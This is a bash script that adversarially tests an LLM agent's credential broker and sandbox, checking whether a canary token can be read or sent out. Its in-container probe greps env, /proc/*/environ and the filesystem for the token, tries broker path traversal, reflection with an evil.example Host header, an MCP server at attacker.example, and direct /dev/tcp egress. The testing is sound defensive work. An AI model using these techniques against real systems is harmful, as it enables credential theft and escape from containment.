#!/usr/bin/env bash
# Underwatch - adversarial test of the LLM credential broker (docker/llm-broker).
#
#   scripts/agent-broker-adversarial.sh
#
# The broker is given a SYNTHETIC canary token (never the real one). The agent container
# is started exactly like a supervised run (same image, uid 1000, cap_drop ALL, internal
# network only, ANTHROPIC_BASE_URL -> broker, per-run placeholder credential, egress proxy
# with the default EMPTY allowlist) and then plays the attacker: it dumps env,
# /proc/*/environ, child-process env, ps args, greps the whole filesystem, the hook spool
# and a live Claude Code stream-json run for the canary, calls non-allowlisted broker
# paths, tries to make the broker reflect credentials, and tries direct egress.
# The canary reaches the in-container probe ONLY on stdin (not env/argv/files), so the
# probe cannot contaminate what it scans. The host then scans docker inspect, broker and
# proxy logs, the hook spool and the stream-json for the canary.
#
# Each result is classified as:
#   UNAVAILABLE  secret not readable by the agent
#   BLOCKED      secret readable but transmission blocked   (none expected)
#   EXPOSED      secret readable with no effective protection
# or, for transmission/route tests, DENIED / ALLOWED.
# Output: $KW_ADV_OUT (default $TMPDIR/kw-broker-adversarial)/report.txt ; exit 0 only if
# nothing is EXPOSED and every route test is DENIED.
set -euo pipefail
umask 077

REPO="$(cd "$(dirname "$0")/.." && pwd)"
OUT="${KW_ADV_OUT:-${TMPDIR:-/tmp}/kw-broker-adversarial}"
OUT="${OUT%/}"
W="$OUT/.work"
AGENT_IMAGE="kw-agent:2.1.302"
P=kw-adv
NET_INT="$P-int"; NET_EG="$P-eg"; PROXY="$P-proxy"; BROKER="$P-broker"; AGENT="$P-agent"; WS="$P-ws"; HOOKS="$P-hooks"
CANARY="sk-ant-oat01-KWCANARY-adv-$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')"
CLIENT="sk-ant-oat01-kwbroker-$(od -An -N24 -tx1 /dev/urandom | tr -d ' \n')"
LABELS=(--label kw-dev=1 --label kw-broker-adversarial=1)

teardown() {
  set +e
  docker rm -f "$AGENT" "$BROKER" "$PROXY" >/dev/null 2>&1
  docker network rm "$NET_INT" "$NET_EG" >/dev/null 2>&1
  docker volume rm -f "$WS" "$HOOKS" >/dev/null 2>&1
  rm -rf "$W"
}
trap teardown EXIT
teardown
rm -rf "$OUT"; mkdir -p "$OUT" "$W/broker"

for img in "$AGENT_IMAGE" kw-egress-proxy:1 kw-llm-broker:1; do
  docker image inspect "$img" >/dev/null 2>&1 || { echo "missing image $img (build docker/compose.agent.yml first)" >&2; exit 1; }
done

printf '%s' "$CANARY" >"$W/broker/claude-token"
printf '%s' "$CLIENT" >"$W/broker/client-token"
cp "$REPO/docker/egress-proxy/allowlist.ere" "$W/allowlist.ere"
cp "$REPO/docker/agent/kw-hook.placeholder.mjs" "$W/kw-hook.mjs"
mkdir -p "$W/policy" "$W/adv"
cp "$REPO/docker/agent/policy/managed-settings.json" "$W/policy/managed-settings.json"
chmod 0755 "$W" "$W/policy" "$W/adv"; chmod 0644 "$W/allowlist.ere" "$W/kw-hook.mjs" "$W/policy/managed-settings.json"

# ------------------------------------------------------------------ in-container probe
cat >"$W/adv/probe.sh" <<'PROBE'
#!/bin/bash
# Runs as the agent uid inside the agent container. Reads the canary ONLY from stdin.
set +e
IFS= read -r PAT
pf() { printf '%s\n' "$PAT"; }
found() { grep -qF -f <(pf) "$@" 2>/dev/null; }
r() { printf '%s|%s|%s\n' "$1" "$2" "$3"; }
secret() { if [ "$2" -gt 0 ]; then r "$1" EXPOSED "$3 hits=$2"; else r "$1" UNAVAILABLE "$3 hits=0"; fi; }

echo "INFO|identity|$(id)"
echo "INFO|credential_env|CLAUDE_CODE_OAUTH_TOKEN=$(case "${CLAUDE_CODE_OAUTH_TOKEN:-}" in sk-ant-oat01-kwbroker-*) echo placeholder;; '') echo none;; *) echo OTHER;; esac) ANTHROPIC_BASE_URL=${ANTHROPIC_BASE_URL:-unset}"

# S1 env dump
secret S1_env_dump "$(env | grep -cF -f <(pf))" "env"

# S2 /proc/*/environ of every visible process
n=0; rd=0; h=0
for d in /proc/[0-9]*; do n=$((n+1)); if [ -r "$d/environ" ] && tr '\0' '\n' <"$d/environ" >/dev/null 2>&1; then rd=$((rd+1)); tr '\0' '\n' <"$d/environ" 2>/dev/null | grep -qF -f <(pf) && h=$((h+1)); fi; done
secret S2_proc_environ "$h" "pids=$n readable=$rd"

# S3 child processes: a live Claude Code process (same env as a real run) + its children + shells
claude -p "Reply with OK." --output-format stream-json --verbose --include-hook-events --max-turns 1 --strict-mcp-config >/tmp/adv-claude.stream.jsonl 2>/tmp/adv-claude.stderr &
CPID=$!
# Poll while it runs (it exits quickly on the broker's 401): scan claude + every descendant.
h=0; seen=0; polls=0
for _ in $(seq 1 80); do
  kill -0 $CPID 2>/dev/null || break
  polls=$((polls+1))
  for p in $CPID $(pgrep -P $CPID 2>/dev/null); do
    tr '\0' '\n' </proc/$p/environ 2>/dev/null | grep -c . >/dev/null || continue
    seen=$((seen+1))
    tr '\0' '\n' </proc/$p/environ 2>/dev/null | grep -qF -f <(pf) && h=$((h+1))
    tr '\0' '\n' </proc/$p/cmdline 2>/dev/null | grep -qF -f <(pf) && h=$((h+1))
  done
  sleep 0.05
done
c1=$(bash -c 'cat /proc/self/environ' | tr '\0' '\n' | grep -cF -f <(pf))
c2=$(node -e 'process.stdout.write(JSON.stringify(process.env))' | grep -cF -f <(pf))
secret S3_child_process_env "$((h+c1+c2))" "claude_proc_scans=$seen polls=$polls bash_child=$c1 node_child=$c2"

# S4 ps args + /proc/*/cmdline
secret S4_ps_args "$(ps -eo args 2>/dev/null | grep -cF -f <(pf))" "ps -eo args"
h=0; for d in /proc/[0-9]*; do tr '\0' ' ' <"$d/cmdline" 2>/dev/null | grep -qF -f <(pf) && h=$((h+1)); done
secret S5_proc_cmdline "$h" "/proc/*/cmdline"

# wait for the claude run to end (it gets 401 via the broker: canary is not a valid token)
for _ in $(seq 1 60); do kill -0 $CPID 2>/dev/null || break; sleep 1; done
kill $CPID 2>/dev/null

# S6 filesystem grep (everything readable except pseudo-filesystems), incl. /tmp $HOME /workspace mounts
hits=$(grep -rlsF -f <(pf) / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null | wc -l | tr -d ' ')
secret S6_filesystem_grep "$hits" "/ (excl proc,sys,dev)"
for d in /tmp "$HOME" /workspace /kw-hooks /etc/claude-code /opt/kw /run; do
  secret "S6_dir[$d]" "$(grep -rlsF -f <(pf) "$d" 2>/dev/null | wc -l | tr -d ' ')" "$d"
done
ls /run/kw-secrets >/dev/null 2>&1 && r S6_broker_secret_dir EXPOSED "/run/kw-secrets exists in agent" || r S6_broker_secret_dir UNAVAILABLE "/run/kw-secrets absent"

# S7 hook spool + stream-json of the live run
secret S7_hook_spool "$(cat /kw-hooks/hooks.ndjson 2>/dev/null | grep -cF -f <(pf))" "lines=$(wc -l </kw-hooks/hooks.ndjson 2>/dev/null | tr -d ' ')"
secret S8_stream_json "$(cat /tmp/adv-claude.stream.jsonl /tmp/adv-claude.stderr 2>/dev/null | grep -cF -f <(pf))" "result=$(grep -o '"result":"[^"]*"' /tmp/adv-claude.stream.jsonl | tail -1 | cut -c1-80)"

# B: broker surface (any 2xx on a non-allowlisted path = ALLOWED)
B="$ANTHROPIC_BASE_URL"; A="Authorization: Bearer $CLAUDE_CODE_OAUTH_TOKEN"
for spec in "GET /v1/models" "HEAD /api/hello" "GET /api/oauth/profile" "POST /v1/files" "POST /v1/messages/batches" "GET /v1/messages" \
            "POST /v1/messages/../models" "POST /v1/messages%2f..%2fmodels" "POST //api.anthropic.com/v1/messages" "POST /v1/messages?beta=true&x=1" \
            "TRACE /v1/messages" "OPTIONS /v1/messages" "POST /v1/complete" "GET /"; do
  m=${spec%% *}; u=${spec#* }
  code=$(curl -s -o /dev/null -w '%{http_code}' --path-as-is -X "$m" -H "$A" --max-time 10 "$B$u")
  case "$code" in 2*) r "B1_path[$spec]" ALLOWED "http=$code";; *) r "B1_path[$spec]" DENIED "http=$code";; esac
done
code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 --request-target 'http://example.com/v1/messages' -X POST -H "$A" "$B/")
case "$code" in 2*) r B2_absolute_form ALLOWED "http=$code";; *) r B2_absolute_form DENIED "http=$code";; esac
code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X POST -H "Authorization: Bearer sk-ant-oat01-kwbroker-guess" -d '{}' "$B/v1/messages")
case "$code" in 2*) r B3_wrong_run_credential ALLOWED "http=$code";; *) r B3_wrong_run_credential DENIED "http=$code";; esac

# B4: ask Anthropic to reach the outside world for us (server tools / MCP connector) -> must be refused by the broker
for body in '{"model":"claude-haiku-4-5","max_tokens":16,"messages":[{"role":"user","content":"x"}],"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}]}' \
            '{"model":"claude-haiku-4-5","max_tokens":16,"messages":[{"role":"user","content":"x"}],"tools":[{"type":"web_search_20250305","name":"web_search"}]}' \
            '{"model":"claude-haiku-4-5","max_tokens":16,"messages":[{"role":"user","content":"x"}],"mcp_servers":[{"type":"url","url":"https://attacker.example/mcp","name":"x"}]}'; do
  t=$(printf '%s' "$body" | grep -o '"type":"[a-z_0-9]*","name"\|mcp_servers' | head -1 | cut -c1-40)
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 -X POST -H "$A" -H 'content-type: application/json' -d "$body" "$B/v1/messages?beta=true")
  [ "$code" = 403 ] && r "B4_server_side_egress[$t]" DENIED "http=$code" || r "B4_server_side_egress[$t]" ALLOWED "http=$code"
done

# R: reflection attempts - full response headers+body must not contain the canary
h=0; n=0
for args in "-X POST -d {}" "-X POST -d {\"model\":\"x\",\"max_tokens\":1,\"messages\":[]}" "-X POST -H Host:evil.example -H X-Forwarded-Host:evil.example -H X-Echo:1 -d {}" \
            "-X POST -H Expect:100-continue -d {}" "-X POST -H anthropic-beta:echo-headers -d {}"; do
  n=$((n+1))
  # shellcheck disable=SC2086
  curl -s -D - --max-time 20 $args -H "$A" -H 'content-type: application/json' "$B/v1/messages?beta=true" >/tmp/adv-reflect.$n 2>&1
  found /tmp/adv-reflect.$n && h=$((h+1))
  curl -s -D - --max-time 20 $args -H "$A" -H 'content-type: application/json' "$B/v1/messages/count_tokens" >/tmp/adv-reflect.c$n 2>&1
  found /tmp/adv-reflect.c$n && h=$((h+1))
done
secret R1_broker_reflection "$h" "responses=$((n*2)) statuses=$(grep -h -m1 '^HTTP/' /tmp/adv-reflect.* | awk '{print $2}' | sort | uniq -c | tr -s ' \n' ' ')"

# E: direct egress (expected: all DENIED)
e() { if [ "$2" = ok ]; then r "$1" ALLOWED "$3"; else r "$1" DENIED "$3"; fi; }
x=$(curl -s -o /dev/null -w 'connect=%{http_connect}' --max-time 15 https://api.anthropic.com/ 2>&1); [ "$?" = 0 ] && e E1_api_via_proxy ok "$x" || e E1_api_via_proxy no "$x"
x=$(curl -s -o /dev/null -w 'connect=%{http_connect}' --max-time 15 https://example.com/ 2>&1); [ "$?" = 0 ] && e E2_internet_via_proxy ok "$x" || e E2_internet_via_proxy no "$x"
x=$(curl --noproxy '*' -s -o /dev/null -w 'http=%{http_code}' --max-time 8 https://api.anthropic.com/ 2>&1); [ "$?" = 0 ] && e E3_api_direct ok "$x" || e E3_api_direct no "$x"
timeout 8 bash -c 'exec 3<>/dev/tcp/1.1.1.1/443' 2>/dev/null && e E4_tcp_1.1.1.1 ok "" || e E4_tcp_1.1.1.1 no "connect failed"
timeout 8 bash -c 'exec 3<>/dev/tcp/160.79.104.10/443' 2>/dev/null && e E5_tcp_anthropic_ip ok "" || e E5_tcp_anthropic_ip no "connect failed"
getent hosts api.anthropic.com >/dev/null 2>&1 && e E6_external_dns ok "" || e E6_external_dns no "no resolution"
x=$(curl -s -o /dev/null -w 'http=%{http_code} connect=%{http_connect}' -p -x "$B" --max-time 10 https://example.com/ 2>&1); [ "$?" = 0 ] && e E7_broker_as_connect_proxy ok "$x" || e E7_broker_as_connect_proxy no "$x"
x=$(curl -s -o /dev/null -w 'http=%{http_code}' -x "$B" --max-time 10 http://example.com/ 2>&1); case "$x" in *http=2*) e E8_broker_as_http_proxy ok "$x";; *) e E8_broker_as_http_proxy no "$x";; esac
exit 0
PROBE
chmod 0644 "$W/adv/probe.sh"

# ------------------------------------------------------------------ environment (same shape as a real run)
docker network create --internal "${LABELS[@]}" "$NET_INT" >/dev/null
docker network create "${LABELS[@]}" "$NET_EG" >/dev/null
SUBNET="$(docker network inspect -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}' "$NET_INT")"
docker volume create "${LABELS[@]}" "$WS" >/dev/null
docker volume create "${LABELS[@]}" "$HOOKS" >/dev/null
docker run --rm --network none --user 0 --entrypoint sh -v "$WS:/workspace" -v "$HOOKS:/kw-hooks" "$AGENT_IMAGE" \
  -c 'printf "# adv fixture\n" >/workspace/README.md; chown -R 1000:1000 /workspace /kw-hooks; chmod 0700 /kw-hooks'
docker run -d --name "$PROXY" "${LABELS[@]}" --network "$NET_INT" --read-only --tmpfs /tmp --cap-drop ALL --cap-add SETUID --cap-add SETGID \
  --security-opt no-new-privileges:true -e "KW_ALLOW_SUBNET=$SUBNET" -v "$W/allowlist.ere:/etc/kw-egress/allowlist.ere:ro" kw-egress-proxy:1 >/dev/null
docker network connect "$NET_EG" "$PROXY"
docker run -d --name "$BROKER" "${LABELS[@]}" --network "$NET_INT" --read-only --cap-drop ALL --security-opt no-new-privileges:true \
  --pids-limit 64 --memory 256m -v "$W/broker/claude-token:/run/kw-secrets/claude-token:ro" -v "$W/broker/client-token:/run/kw-secrets/client-token:ro" kw-llm-broker:1 >/dev/null
docker network connect "$NET_EG" "$BROKER"
for _ in $(seq 1 40); do docker logs "$BROKER" 2>&1 | grep -q '"event":"listening"' && docker logs "$PROXY" 2>&1 | grep -q 'listening on fd' && break; perl -e 'select(undef,undef,undef,0.25)'; done

PURL="http://$PROXY:8888"
set +e
printf '%s\n' "$CANARY" | CLAUDE_CODE_OAUTH_TOKEN="$CLIENT" docker run -i --name "$AGENT" "${LABELS[@]}" --network "$NET_INT" --user 1000:1000 --init \
  --cap-drop ALL --security-opt no-new-privileges:true --pids-limit 512 --memory 2g \
  -v "$WS:/workspace" -v "$HOOKS:/kw-hooks" -v "$W/policy:/etc/claude-code:ro" -v "$W/kw-hook.mjs:/opt/kw/kw-hook.mjs:ro" -v "$W/adv:/opt/kw-adv:ro" \
  -e KW_HOOK_LOG=/kw-hooks/hooks.ndjson -e KW_MODEL=haiku -e KW_MAX_TURNS=1 \
  -e "HTTPS_PROXY=$PURL" -e "HTTP_PROXY=$PURL" -e "https_proxy=$PURL" -e "http_proxy=$PURL" \
  -e "NO_PROXY=localhost,127.0.0.1,$BROKER" -e "no_proxy=localhost,127.0.0.1,$BROKER" \
  -e "ANTHROPIC_BASE_URL=http://$BROKER:8080" -e CLAUDE_CODE_OAUTH_TOKEN \
  "$AGENT_IMAGE" bash /opt/kw-adv/probe.sh >"$OUT/probe.txt" 2>"$OUT/probe.stderr"
echo "probe exit=$?" >>"$OUT/probe.stderr"
set -e

# ------------------------------------------------------------------ host-side scans
docker cp "$AGENT:/tmp/adv-claude.stream.jsonl" "$OUT/claude.stream.jsonl" >/dev/null 2>&1 || true
docker cp "$AGENT:/tmp/adv-claude.stderr" "$OUT/claude.stderr" >/dev/null 2>&1 || true
docker inspect "$AGENT" >"$OUT/inspect-agent.json"
docker inspect "$BROKER" >"$OUT/inspect-broker.json"
docker logs "$BROKER" >"$OUT/broker.log" 2>&1
docker logs "$PROXY" >"$OUT/proxy.log" 2>&1
docker run --rm --network none --user 0 --entrypoint sh -v "$HOOKS:/kw-hooks:ro" "$AGENT_IMAGE" -c 'cat /kw-hooks/hooks.ndjson 2>/dev/null; true' >"$OUT/hooks.ndjson"
hs() { local n; n=$(grep -cF -e "$CANARY" "$2" 2>/dev/null || true); n=${n:-0}; if [ "$n" -gt 0 ]; then echo "$1|EXPOSED|hits=$n"; else echo "$1|UNAVAILABLE|hits=0"; fi; }
{
  cat "$OUT/probe.txt"
  hs H1_docker_inspect_agent "$OUT/inspect-agent.json"
  hs H2_docker_inspect_broker "$OUT/inspect-broker.json"
  hs H3_broker_log "$OUT/broker.log"
  hs H4_proxy_log "$OUT/proxy.log"
  hs H5_hook_spool_host_copy "$OUT/hooks.ndjson"
  hs H6_stream_json_host_copy "$OUT/claude.stream.jsonl"
  hs H7_probe_output "$OUT/probe.txt"
  echo "INFO|broker_requests|$(grep -o '"method":"[A-Z]*","path":"[^"]*","status":[0-9]*,"decision":"[a-z_]*"' "$OUT/broker.log" | sed 's/"method"://; s/,"path":/ /; s/,"status":/ /; s/,"decision":/ /; s/"//g' | sort | uniq -c | tr -s ' ' | tr '\n' ';')"
  echo "INFO|proxy_requests|$(grep -c 'Request (file descriptor' "$OUT/proxy.log" || true) refused=$(grep -c 'refused\|Refused' "$OUT/proxy.log" || true)"
  echo "INFO|hook_spool_lines|$(grep -c . "$OUT/hooks.ndjson" || true)"
} >"$OUT/report.txt"
# The canary must not end up in the report itself either.
grep -qF -e "$CANARY" "$OUT/report.txt" && { echo "canary in report!" >&2; exit 3; }
cat "$OUT/report.txt"
bad=$(grep -cE '\|(EXPOSED|ALLOWED)\|' "$OUT/report.txt" || true)
miss=$(grep -cE '^(S|B|R|E|H)[0-9]' "$OUT/report.txt" || true)
echo "summary: checks=$miss exposed_or_allowed=$bad"
[ "${bad:-0}" = 0 ] && [ "${miss:-0}" -ge 40 ]
